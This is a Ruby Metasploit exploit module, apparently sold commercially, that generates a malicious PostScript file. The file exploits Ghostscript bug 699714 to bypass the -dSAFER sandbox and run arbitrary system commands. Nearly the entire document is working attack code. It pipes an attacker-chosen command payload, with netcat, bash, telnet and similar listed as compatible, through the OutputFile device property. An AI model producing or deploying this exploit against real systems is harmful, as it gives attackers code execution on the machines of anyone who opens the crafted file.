##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/zip'

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Ghostscript -dSAFER Bypass Code Execution',
      'Description'    => %q{
       This module creates a PostScript file that runs arbitrary commands on vulnerable GhostScript versions.

    Ghostscript <= 9.24 was vulnerable to poor error handling that allowed an
    attacker to bypass the -dSAFER restricted sandbox and execute system commands
    when parsing specially-crafted PostScript files.

    Categories: Open Source

    Price: 3

    Video: https://asciinema.org/a/88OX4bFcjZmbn0HtKHMa8eGkh

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'License'        => 'VolatileMinds',
      'Author'         =>
        [
        ],
      'References'     =>
        [
        ],
      'Platform'          => [ 'unix','linux','windows','osx' ],
      'Arch' => ARCH_CMD,
      'Payload'           =>
        {
		'BadChars' => "%\n)\\",
		'Compat' => {
			'PayloadType' => 'cmd',
			'RequiredCmd' => 'generic telnet bash netcat python perl',
		}
        },
      'Targets'        =>
        [
          [ 'Default', { }],
        ],
      'DisclosureDate' => '',
      'DefaultTarget'  => 0))

      register_options(
        [
		OptString.new('FILENAME', [ true, 'The output file name.', 'msf.ps']),
        ])
  end

  def exploit

    file = %Q{
%!PS
% This is ghostscript bug 699714, a variant of 699687 (which is itself a variant of 699654).

userdict /setpagedevice undef
currentpagedevice /PageSize get 0 (foobar) put
a0
{ grestore } stopped clear

% make sure we have a device with OutputFile
(ppmraw) selectdevice

mark /OutputFile (%pipe%#{payload.encoded}) currentdevice putdeviceprops

{ showpage } stopped pop
quit
    }
    # Create the file
    print_status("Creating '#{datastore['FILENAME']}' file...")

    file_create(file)
  end

end
